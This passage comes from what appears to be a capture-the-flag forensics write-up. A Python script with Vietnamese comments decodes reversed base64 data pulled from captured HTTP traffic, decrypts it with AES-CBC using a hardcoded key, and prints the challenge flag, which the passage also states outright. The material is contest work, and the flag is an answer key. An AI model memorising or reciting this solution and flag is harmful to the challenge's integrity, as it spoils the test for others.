    reversed_value = reversed_value.replace('-', 'C').replace('_', 'E')
    
    while len(reversed_value) % 4 != 0:
        reversed_value += '='
    
    decoded_bytes = base64.b64decode(reversed_value)
    
    # Chuyển đổi dữ liệu giải mã sang dạng hex
    hex_string = decoded_bytes.hex()
    
    return hex_string

def aes_decrypt(key, encrypted_text=None, file_path=None):
    sha256 = hashlib.sha256()
    sha256.update(key.encode('utf-8'))
    aes_key = sha256.digest()
    
    # In khóa SHA-256 dưới dạng hex string
    #print(f"SHA-256 Key: {aes_key.hex()}")

    # Đọc IV và dữ liệu mã hóa
    if encrypted_text:
        encrypted_bytes = bytes.fromhex(encrypted_text)  # Giải mã từ hex
        iv = encrypted_bytes[:16]
        cipher_bytes = encrypted_bytes[16:]
    elif file_path:
        with open(file_path, 'rb') as encrypted_file:
            encrypted_bytes = encrypted_file.read()
        iv = encrypted_bytes[:16]
        cipher_bytes = encrypted_bytes[16:]
        out_path = file_path.replace('.enc', '')
    
    aes = AES.new(aes_key, AES.MODE_CBC, iv)
    
    decrypted_bytes = aes.decrypt(cipher_bytes)
    
    # Loại bỏ padding PKCS7
    padding_length = decrypted_bytes[-1]
    decrypted_bytes = decrypted_bytes[:-padding_length]
    
    if encrypted_text:
        return decrypted_bytes.decode('utf-8')
    elif file_path:
        with open(out_path, 'wb') as decrypted_file:
            decrypted_file.write(decrypted_bytes)
        return f"Decrypted file saved to: {out_path}"

key = "YaMfem0zr4jdiZsDUxv1TH69"
for i in range(1, 60):
    name = "flag_" + str(i) + ".txt.enc"
    name_encrypt = find_name(name)
    # print(name_encrypt)
    with open("data.txt", 'r') as file:
        lines = file.readlines()

    # Tìm dòng chứa chuỗi tìm kiếm
    for i, line in enumerate(lines):
        if name_encrypt in line:
            #print(f"Found at line {i + 1}: {line.strip()}")
            # Kiểm tra và in dòng thứ 5 sau dòng tìm thấy
            target_line_index = i + 5  # Dòng thứ 5 sau dòng tìm thấy
            if target_line_index < len(lines):
                encrypt_data = lines[target_line_index].strip().replace("HTTP/1.1 200 OK", "")
                print(aes_decrypt(key, decode_data_R64(encrypt_data)), end='')
            else:
                print("There are less than 5 lines after the matching line.")
            break
    else:
        print("String not found in the file.")

```
> Flag : ASCIS{N0th1n9_1$_m0r3_pr3c10u5_7h4n_1ndEp3ndenc3_&_fr33d0m}
